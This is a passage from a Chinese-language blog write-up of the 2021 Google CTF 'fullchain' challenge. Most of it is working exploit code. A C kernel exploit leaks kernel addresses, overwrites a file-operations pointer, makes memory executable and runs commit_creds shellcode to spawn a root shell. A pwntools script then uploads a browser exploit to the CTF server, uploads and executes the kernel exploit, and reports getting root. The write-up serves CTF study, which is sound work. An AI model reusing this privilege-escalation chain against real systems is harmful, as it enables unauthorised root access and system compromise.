    <span class="token comment">// search file whose private_data point to ctf[0].mem (fd[1]'s ctf_data.mem -> ctf[1])</span>
    <span class="token class-name">uint64_t</span> start <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mem <span class="token operator">&amp;</span> <span class="token number">0xfffffffff0000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> target <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mem<span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"from %p to %p search %lx\n"</span><span class="token punctuation">,</span> start<span class="token punctuation">,</span> start <span class="token operator">+</span> MEM_SCAN_SIZE<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_read</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> MEM_SCAN_SIZE<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token class-name">uint64_t</span> file_addr <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">==</span> buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mem<span class="token operator">+</span>i<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xc8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// offset of file.private_data = 0xc8</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"found at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mem<span class="token operator">+</span>i<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            file_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mem<span class="token operator">+</span>i<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>file_addr <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"leak infomation\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_read</span><span class="token punctuation">(</span>file_addr<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token class-name">uint64_t</span> vfsmount_ <span class="token operator">=</span> buffer<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// (struct file).f_path.mnt</span>
    <span class="token class-name">uint64_t</span> fop <span class="token operator">=</span> buffer<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// (struct file).f_op</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"vfsmount = %p\n"</span><span class="token punctuation">,</span> vfsmount_<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fop = %p\n"</span><span class="token punctuation">,</span> fop<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_read</span><span class="token punctuation">(</span>vfsmount_<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token class-name">uint64_t</span> init_user_ns <span class="token operator">=</span> buffer<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// vfsmount_.mnt_userns</span>
    <span class="token class-name">uint64_t</span> kernel_offset <span class="token operator">=</span> init_user_ns <span class="token operator">-</span> <span class="token number">0xffffffff8244c020</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"init_user_ns = %p\n"</span><span class="token punctuation">,</span> init_user_ns<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"save file's memory\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> save_file<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_read</span><span class="token punctuation">(</span>file_addr<span class="token punctuation">,</span> save_file<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>save_file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">memcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> save_file<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>save_file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"change file's fop\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> fake_fop <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> ctf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mem<span class="token punctuation">;</span>
    buffer<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> fake_fop<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_write</span><span class="token punctuation">(</span>file_addr<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>save_file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"set file's fop\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_read</span><span class="token punctuation">(</span>fop<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token class-name">uint64_t</span> shellcode_addr <span class="token operator">=</span> file_addr <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">;</span>
    buffer<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> SET_MEMORY_X<span class="token punctuation">;</span> <span class="token comment">// read</span>
    buffer<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> shellcode_addr<span class="token punctuation">;</span> <span class="token comment">// write (shellcode addr)</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_write</span><span class="token punctuation">(</span>fake_fop<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"set file_addr executable\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"write shellcode\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'\x48'</span><span class="token punctuation">,</span> <span class="token string">'\x31'</span><span class="token punctuation">,</span> <span class="token string">'\xff'</span><span class="token punctuation">,</span>                 <span class="token comment">// xor rdi, rdi</span>
        <span class="token string">'\x48'</span><span class="token punctuation">,</span> <span class="token string">'\xbe'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment">// movabs rsi, 0</span>
        <span class="token string">'\xff'</span><span class="token punctuation">,</span> <span class="token string">'\xd6'</span><span class="token punctuation">,</span>                         <span class="token comment">// call rsi</span>
        <span class="token string">'\x48'</span><span class="token punctuation">,</span> <span class="token string">'\xbe'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment">// movabs rsi, 0</span>
        <span class="token string">'\xff'</span><span class="token punctuation">,</span> <span class="token string">'\xd6'</span><span class="token punctuation">,</span>                         <span class="token comment">// call rsi</span>
        <span class="token string">'\xc3'</span><span class="token punctuation">,</span>                                 <span class="token comment">// ret</span>

    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token class-name">uint64_t</span> pre <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> PREPARE_KERNEL_CRED<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> com <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> COMMIT_CREDS<span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>shellcode<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pre<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>shellcode<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>com<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_write</span><span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">,</span> shellcode<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">12</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"call shellcode\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"restore fop\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_write</span><span class="token punctuation">(</span>file_addr<span class="token punctuation">,</span> save_file<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>save_file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pwn!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>exp.py：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># python3</span>

<span class="token keyword">from</span> kctfpow <span class="token keyword">import</span> solve_challenge
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode

<span class="token keyword">def</span> <span class="token function">to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ret <span class="token operator">=</span> <span class="token string">''</span>

    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> ch <span class="token keyword">in</span> s<span class="token punctuation">:</span>
            ch <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span>
            ret <span class="token operator">+=</span> <span class="token string">'\\x'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
        
    <span class="token keyword">elif</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> ch <span class="token keyword">in</span> s<span class="token punctuation">:</span>
            ret <span class="token operator">+=</span> <span class="token string">'\\x'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">''</span>

    <span class="token keyword">return</span> ret

<span class="token keyword">def</span> <span class="token function">exec_cmd</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'$ '</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">,</span> block_size<span class="token operator">=</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> log<span class="token punctuation">.</span>progress<span class="token punctuation">(</span><span class="token string">"Upload"</span><span class="token punctuation">)</span>
    
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fd<span class="token punctuation">:</span>
        data <span class="token operator">=</span> fd<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> block_size<span class="token punctuation">)</span><span class="token punctuation">:</span>
        p<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token string">"%d / %d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        exec_cmd<span class="token punctuation">(</span><span class="token string">"echo -e -n '%s' >> %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>to_hex<span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span>block_size<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    p<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token punctuation">)</span>


sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'fullchain.2021.ctfcompetition.com'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span>
<span class="token comment"># sh = process(['python3', 'run_qemu.py']) #, stdin=PTY, stdout=PTY)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">') solve '</span><span class="token punctuation">)</span>
solve <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>

info<span class="token punctuation">(</span><span class="token string">'solve = &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solve<span class="token punctuation">)</span><span class="token punctuation">)</span>

solution <span class="token operator">=</span> solve_challenge<span class="token punctuation">(</span>solve<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Solution? '</span><span class="token punctuation">,</span> solution<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Correct\n'</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>


context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'exp.html'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fd<span class="token punctuation">:</span>
    data <span class="token operator">=</span> fd<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

html <span class="token operator">=</span> b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'? '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># sh.interactive()</span>
<span class="token comment"># exit()</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Give me your exploit as base64!\n'</span><span class="token punctuation">,</span> html<span class="token punctuation">)</span>
<span class="token comment"># sh.send(html)</span>
success<span class="token punctuation">(</span><span class="token string">'upload exp.html successfully!'</span><span class="token punctuation">)</span>


exec_cmd<span class="token punctuation">(</span><span class="token string">'bash'</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string">'exploit chrome successfully!'</span><span class="token punctuation">)</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'info'</span>
upload<span class="token punctuation">(</span><span class="token string">'./exp'</span><span class="token punctuation">,</span> <span class="token string">'/tmp/exp'</span><span class="token punctuation">,</span> <span class="token number">800</span><span class="token punctuation">)</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
exec_cmd<span class="token punctuation">(</span><span class="token string">'chmod +x /tmp/exp'</span><span class="token punctuation">)</span>

exec_cmd<span class="token punctuation">(</span><span class="token string">'/tmp/exp'</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'# '</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string">'get root!'</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>kctfpow: <a target="_blank" rel="external nofollow noopener noreferrer" href="https://raw.githubusercontent.com/google/kctf/v1/docker-images/challenge/pow.py">https://raw.githubusercontent.com/google/kctf/v1/docker-images/challenge/pow.py</a></p>
<p><img src="/images/68622871/14.png" alt="get!"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题目还是挺有意思的，v8，sandbox-escape 以及 kernel pwn 各个点都比较入门，能学到东西</p>
<p>虽然简单，但就算当时去做，也未必做得出来，一方面网络及其不稳定，容易中途就崩了，另一方面可执行程序太大了，运行个 ROPgadget 或者 ropper 跑了几个小时了还没出来，不知道还能怎么找 gadget 了，再一方面还是可执行程序太大了，ida 打开卡死半天，搜索也卡半天，最后用 ghidra 来分析的</p>
<p><em>直到这篇文章发布，ropper 仍未运行完</em></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://ptr-yudai.hatenablog.com/entry/2021/07/26/225308" id="Hatena_wp">https://ptr-yudai.hatenablog.com/entry/2021/07/26/225308 <strong>#Hatena_wp</strong> </a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/dqi/ctf_writeup/tree/master/2021/fullchain">https://github.com/dqi/ctf_writeup/tree/master/2021/fullchain</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/set">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/set</a></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>原作者： </strong>feather
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="http://www.xi4oyu.top/68622871/" title="2021-google-ctf-pwn-fullchain">http://www.xi4oyu.top/68622871/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
